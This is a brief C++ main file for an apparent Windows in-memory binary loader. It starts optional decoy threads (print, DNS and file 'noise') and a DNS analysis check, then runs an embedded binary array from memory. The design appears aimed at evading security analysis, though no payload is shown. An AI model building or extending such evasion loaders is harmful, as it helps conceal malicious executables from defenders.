#include <string>
#include <iostream>
#include <thread>

#include <windows.h>
#include <loader.hpp>

#ifndef _GERNIG_DEBUG
#include <binexp.h>
// #include <dnsnoise.h>
// #include <dnsanalysis.h>
#include <defines.h>
#endif

#include <modules/print.hpp>
#include <modules/dns.hpp>
#include <modules/file.hpp>

int main(int argc, char **argv)
{
#ifdef _PRINT_NOISE_ENABLED
    std::thread printNoiseThread(printLoop, _PRINT_NOISE_TEXT);
#endif

#ifdef _DNS_NOISE_ENABLED
    std::thread dnsNoiseThread(queryDomains);
#endif

#ifdef _DNS_ANALYSIS_ENABLED
    std::thread dnsAnalysisThread(checkDNS);
    dnsAnalysisThread.join();
#endif

#ifdef _FILE_NOISE_ENABLED
    std::thread fileNoiseThread(generateFiles);
#endif


#ifndef _GERNIG_DEBUG
    LoadFromMemory(&BINARY_ARRAY, sizeof(BINARY_ARRAY));
#else
    LoadFromFile(argv[1]);
#endif

    return 0;
}
